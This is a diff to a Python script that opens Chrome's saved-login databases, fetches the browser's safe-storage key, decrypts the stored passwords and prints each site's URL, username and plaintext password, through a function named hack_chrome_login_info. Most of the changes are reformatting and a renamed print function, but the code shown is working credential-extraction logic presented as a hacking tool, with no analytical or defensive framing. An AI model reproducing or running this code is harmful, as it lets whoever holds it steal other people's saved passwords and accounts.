@@ -192,7 +192,9 @@ def process_login_data(login_data_path: str, safe_storage_key: str) -> list[Logi
 
             # Decrypt the password
             decrypted_password = chrome_decrypt(encrypted_password, key_16)
-            decrypted_list.append(LoginInfo(url or "[No URL]", username, decrypted_password))
+            decrypted_list.append(
+                LoginInfo(url or "[No URL]", username, decrypted_password)
+            )
             # decrypted_list.append((url or "[No URL]", username, decrypted_password))
 
         cursor.close()
@@ -206,7 +208,8 @@ def process_login_data(login_data_path: str, safe_storage_key: str) -> list[Logi
 
     return decrypted_list
 
-def beauty_print(login_list: list[LoginInfo]) -> None:
+
+def beauty_print_chrome(login_list: list[LoginInfo]) -> None:
     """
     美观地打印包含 LoginInfo 的列表。
 
@@ -215,7 +218,7 @@ def beauty_print(login_list: list[LoginInfo]) -> None:
     if not login_list:
         print("No login information available.")
         return
-    
+
     print("=" * 50)
     print("Login Credentials")
     print("=" * 50)
@@ -230,18 +233,18 @@ def beauty_print(login_list: list[LoginInfo]) -> None:
     print("End of List")
     print("=" * 50)
 
-def hack_chrome_login_info()->list[LoginInfo]:
+
+def hack_chrome_login_info() -> list[LoginInfo]:
     login_data_paths = get_login_data_paths()
     safe_storage_key = fetch_safe_storage_key("Chrome")
-    
-    credentials :list[LoginInfo]= []
+
+    credentials: list[LoginInfo] = []
     for login_data_path in login_data_paths:
-        decrypted_credentials = process_login_data(
-                    login_data_path, safe_storage_key
-                )
+        decrypted_credentials = process_login_data(login_data_path, safe_storage_key)
         credentials.extend(decrypted_credentials)
     return credentials
 
+
 if __name__ == "__main__":
     infos = hack_chrome_login_info()
-    beauty_print(infos)
+    beauty_print_chrome(infos)
